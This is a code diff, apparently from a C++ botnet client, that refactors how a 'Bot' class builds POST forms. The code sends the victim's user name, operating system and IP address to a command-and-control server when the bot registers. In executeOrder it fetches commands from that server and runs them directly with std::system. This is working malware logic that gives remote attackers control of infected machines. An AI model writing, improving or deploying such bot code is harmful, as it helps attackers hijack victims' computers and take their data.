@@ -123,10 +123,11 @@ bool Bot::isInit() {
 void Bot::executeOrder() {
     // Retrieve commands to run and execute
     _prepareSysInfo();
-    std::string postForm =
-        "hash_sum=" + _hashSum
-        + "&ip_addr=" + _ipAddr;
-    std::string cmd = request::post(_c2Server->getCmdUrl(), postForm);
+    request::PostForm postForm;
+    postForm.addField("hash_sum", _hashSum);
+    postForm.addField("ip_addr", _ipAddr);
+
+    std::string cmd = request::post(_c2Server->getCmdUrl(), postForm.toString());
     std::system(cmd.c_str());
 }
 
@@ -156,11 +157,11 @@ void Bot::_prepareSysInfo() {
 void Bot::_registerBot() {
     // Register bot with C2 server
     _prepareSysInfo();
-    std::string postForm =
-        "hash_type=" + _hashType
-        + "&hash_sum=" + _hashSum
-        + "&operating_sys=" + _os
-        + "&user=" + _user
-        + "&ip_addr=" + _ipAddr;
-    request::post(_c2Server->getRegisterUrl(), postForm);
+    request::PostForm postForm;
+    postForm.addField("hash_type", _hashType);
+    postForm.addField("hash_sum", _hashSum);
+    postForm.addField("operating_sys", _os);
+    postForm.addField("user", _user);
+    postForm.addField("ip_addr", _ipAddr);
+    request::post(_c2Server->getRegisterUrl(), postForm.toString());
 }
